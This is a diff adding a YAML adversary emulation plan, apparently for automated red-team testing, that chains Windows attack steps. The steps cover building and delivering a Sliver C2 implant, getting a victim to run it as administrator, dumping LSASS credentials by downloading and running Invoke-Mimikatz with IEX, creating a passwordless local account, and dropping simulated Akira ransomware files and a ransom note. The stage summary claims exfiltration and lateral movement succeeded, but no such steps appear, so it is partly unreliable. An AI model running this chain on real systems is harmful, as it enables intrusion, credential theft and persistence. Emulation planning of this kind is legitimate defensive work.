@@ -1,0 +1,417 @@
+emulation_plan_details:
+  adversary_name: env0
+  creation_time: 2026-07-15 06:02:54 UTC+0000
+  parent_chain_idx: 133
+  internal_chain_idx: 168
+  stage_outcomes:
+    - stage: initial-executor
+      status: succeeded
+      plan_source: attack_plan-5.yml
+    - stage: discovery-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: credential-access-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: persistence-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: privilege-escalation-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: collection-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: exfiltration-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: impact-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+    - stage: lateral-movement-obtained
+      status: succeeded
+      plan_source: attack_plan-1.yml
+attack_action_sequence:
+  - uuid: sliver-payload-windows-exe
+    name: Build the executable file of a Sliver implant (for Windows)
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: Sliver Console
+      command: |
+        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
+        sliver > mtls --lport #{LPORT}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        required: true
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        required: true
+        pddl_index: string0_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+    effects:
+      - (sliver-implant-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?file - file)
+      - (file-on-attacker ?path - string ?file - file)
+      - (standalone-exe-file ?file - file)
+      - (payload-handler-set ?p - payload)
+      - (callback-covered ?file - file)
+  - uuid: simulate-download-execute-file
+    name: Simulate the victim download and execute malicious payload file
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+      - linux
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description:
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server #{LPORT}
+
+        (On victim's machine)
+        1. Open #{LHOST}:8000 in the browser
+        2. Navigate to the path of the target payload file
+        3. Download the payload file
+        4. Execute the payload file to #{SAVE_PATH} (If on a Linux machine, you also need to chmod the file)
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the http file server (typically the attacker machine)
+        required: true
+      LPORT:
+        default: 8000
+        description: port of the http file server
+        required: true
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        required: true
+        pddl_index: string1_var_in_plan
+    preconditions:
+      - (allow-simulate-user-action ?target - host)
+      - operator: or
+        operands:
+          - (os-linux ?target - host)
+          - (os-windows ?target - host)
+          - (os-macos ?target - host)
+      - (file-on-attacker ?localpath - string ?file - file)
+      - operator: or
+        operands:
+          - (standalone-exe-file ?file - file)
+          - (elf-file ?file - file)
+      - (callback-covered ?file - file)
+    effects:
+      - (file-exists ?path - string ?file - file ?target - host)
+      - (file-executed ?file - file ?target - host)
+  - uuid: execute-sliver-payload-file
+    name: Execute a Sliver Implant Payload
+    id:
+      - T1071.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Sliver implant payload will establish a Sliver session.
+    execution:
+      executor: Sliver Session Establish
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (sliver-implant-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?f - file)
+      - (file-executed ?f - file ?target - host)
+      - (payload-handler-set ?p - payload)
+    effects:
+      - (sliver-session ?s - executor ?target - host)
+      - operator: When
+        params:
+          condition: (file-executed-elevated ?f - file ?target - host)
+          effect: (elevated-executor ?s - executor)
+  - uuid: sliver-ping
+    name: Host Availability Check
+    id:
+      - T1018
+    source: Sliver
+    supported_platforms:
+      - windows
+      - linux
+    tactics:
+      - Discovery
+    technique:
+      - Remote System Discovery
+    description: The `ping` command tests network connectivity to the target host.
+    execution:
+      executor: Sliver Executor
+      command: ping(session_id=#{executor})
+    arguments:
+      executor:
+        description: The session ID of the active Sliver connection.
+        required: true
+        pddl_index: executor4_var_in_plan
+    preconditions:
+      - operator: or
+        operands:
+          - (os-windows ?target - host)
+          - (os-linux ?target - host)
+      - (sliver-session ?executorID - executor ?target - host)
+    effects:
+      - (remote-system-info-known ?target - host)
+  - uuid: simulate-execute-lnk-windows-root
+    name: Simulate the victim double-click a shortcut (.lnk) that runs a pre-staged
+      executable as Admin
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description: |
+      This step simulates the victim opening a `.lnk` shortcut whose target is a pre-staged executable **and the shortcut is configured / launched such that the target runs as Administrator** — either the shortcut's Properties → Advanced → "Run as administrator" flag is set, or the victim right-clicks the shortcut and selects "Run as administrator".
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On victim's machine, on the desktop or a folder)
+        Right-click a shortcut (.lnk) whose target is:
+        #{EXE_PATH}
+        then select "Run as administrator" (or open its Properties → Advanced → tick "Run as administrator", then double-click).
+    arguments:
+      EXE_PATH:
+        default:
+        description: Path of the executable the shortcut points at
+        required: true
+        pddl_index: string1_var_in_plan
+    preconditions:
+      - (allow-simulate-user-action ?target - host)
+      - (os-windows ?target - host)
+      - (file-exists ?path - string ?file - file ?target - host)
+      - (standalone-exe-file ?file - file)
+      - (callback-covered ?file - file)
+    effects:
+      - (file-executed-elevated ?file - file ?target - host)
+  - uuid: execute-sliver-payload-file
+    name: Execute a Sliver Implant Payload
+    id:
+      - T1071.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Sliver implant payload will establish a Sliver session.
+    execution:
+      executor: Sliver Session Establish
+      command: |
+        None
+    arguments:
+    preconditions:
+      - (sliver-implant-payload ?p - payload ?target - host)
+      - (file-payload ?p - payload ?f - file)
+      - (file-executed ?f - file ?target - host)
+      - (payload-handler-set ?p - payload)
+    effects:
+      - (sliver-session ?s - executor ?target - host)
+      - operator: When
+        params:
+          condition: (file-executed-elevated ?f - file ?target - host)
+          effect: (elevated-executor ?s - executor)
+  - uuid: sliver-powershell
+    name: Execute PowerShell Command
+    id:
+      - T1059.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - |
+        Command and Scripting Interpreter: PowerShell
+    description: The `powershell.exe` command executes a PowerShell script or command
+      on the remote host. This command is useful for performing system monitoring
+      tasks or gathering information about the processes running on a remote machine.
+    execution:
+      executor: Sliver Session Derive
+      command: |
+        # no-op — derivation only
+    arguments:
+      executor_parent:
+        description: The session ID of the active Sliver connection.
+        required: true
+        pddl_index: executor3_var_in_plan
+      executor_derived:
+        description: The derived Windows Powershell executor.
+        required: true
+        pddl_index: executor0_var_in_plan
+    preconditions:
+      - (os-windows ?target - host)
+      - (sliver-session ?executorID - executor ?target - host)
+    effects:
+      - (powershell ?s2 - executor ?target - host)
+      - operator: When
+        params:
+          condition: (elevated-executor ?executorID - executor)
+          effect: (elevated-executor ?s2 - executor)
+  - uuid: art-t1003_001-mimikatz-powershell
+    name: Powershell Mimikatz
+    id:
+      - T1003.001
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Credential Access
+    technique:
+      - 'OS Credential Dumping: LSASS Memory'
+    description: |
+      Dumps credentials from LSASS memory by invoking a remote Invoke-Mimikatz.ps1
+      (PowerSploit variant). Requires elevated PowerShell context and outbound
+      HTTPS to the script host. See ART auto_generated_guid
+      66fb0bc1-3c3f-47e9-a298-550ecfefacbc for cross-ref.
+    execution:
+      executor: Powershell Executor
+      command: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
+    arguments:
+      executor:
+        description: The Powershell session ID used to invoke the command.
+        required: true
+        pddl_index: executor0_var_in_plan
+      remote_script:
+        default: 
+          https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
+        description: URL to a hosted Invoke-Mimikatz.ps1 (PowerSploit / mirror).
+        required: true
+    preconditions:
+      - (os-windows ?target - host)
+      - (powershell ?executorID - executor ?target - host)
+      - (elevated-executor ?executorID - executor)
+    effects:
+      - (credential-data ?d - data ?target - host)
+      - (data-stored-c2 ?d - data)
+  - uuid: art-t1136_001-new-localuser-ps
+    name: Create a new user in PowerShell
+    id:
+      - T1136.001
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Persistence
+    technique:
+      - 'Create Account: Local Account'
+    description: |
+      PowerShell variant of local user creation: `New-LocalUser -NoPassword`
+      creates a passwordless local account. Same persistence outcome as
+      net user, cleaner cmdlet trail. ART auto_generated_guid
+      bc8be0ac-475c-4fbf-9b1d-9fffd77afbde.
+    execution:
+      executor: Powershell Executor
+      command: |
+        New-LocalUser -Name "#{username}" -NoPassword
+    arguments:
+      executor:
+        description: The Powershell session ID used to invoke New-LocalUser.
+        required: true
+        pddl_index: executor0_var_in_plan
+      username:
+        default: BackupSvcPs
+        description: Local account name to create.
+        required: true
+    preconditions:
+      - (os-windows ?target - host)
+      - (powershell ?executorID - executor ?target - host)
+      - (elevated-executor ?executorID - executor)
+    effects:
+      - (user-created ?u - user ?target - host)
+  - uuid: art-t1486-akira-ransomware-sim
+    name: Akira Ransomware drop Files with .akira Extension and Ransomnote
+    id:
+      - T1486
+    source: Atomic Red Team
+    supported_platforms:
+      - windows
+    tactics:
+      - Impact
+    technique:
+      - Data Encrypted for Impact
+    description: |
+      Simulates Akira ransomware post-encryption artefacts: writes 100
+      random-byte 1MB files with `.akira` extension to `C:\` and drops a
+      ransom note on the user's Desktop. Does not actually encrypt user
+      data — models the observable trail an incident responder would find.
+      Under aurora's "technique-attempted" positioning we accept this as
+      `data-encrypted` (the .akira files are the encrypted artefact from
+      the model's point of view). ART auto_generated_guid
+      ab3f793f-2dcc-4da5-9c71-34988307263f.
+    execution:
+      executor: Powershell Executor
+      command: |
+        1..#{file_count} | ForEach-Object {
+          $out = New-Object byte[] 1073741
+          (New-Object Random).NextBytes($out)
+          [IO.File]::WriteAllBytes("#{output_dir}\test.$_.akira", $out)
+        }
+        "Hi friends" | Out-File -Append "$env:UserProfile\Desktop\#{ransom_note_name}"
+        "Your files have been encrypted." | Out-File -Append "$env:UserProfile\Desktop\#{ransom_note_name}"
+    arguments:
+      executor:
+        description: The Powershell session ID used to drop the .akira files and ransom
+          note.
+        required: true
+        pddl_index: executor0_var_in_plan
+      file_count:
+        default: 100
+        description: Number of .akira artefact files to drop.
+        required: true
+      output_dir:
+        default: C:\Users\Public
+        description: Target-side directory where .akira files are written.
+        required: true
+      ransom_note_name:
+        default: akira_readme.txt
+        description: Ransom-note filename dropped on the user's desktop.
+        required: true
+    preconditions:
+      - (os-windows ?target - host)
+      - (powershell ?executorID - executor ?target - host)
+      - (elevated-executor ?executorID - executor)
+    effects:
+      - (data-encrypted ?d - data ?target - host)
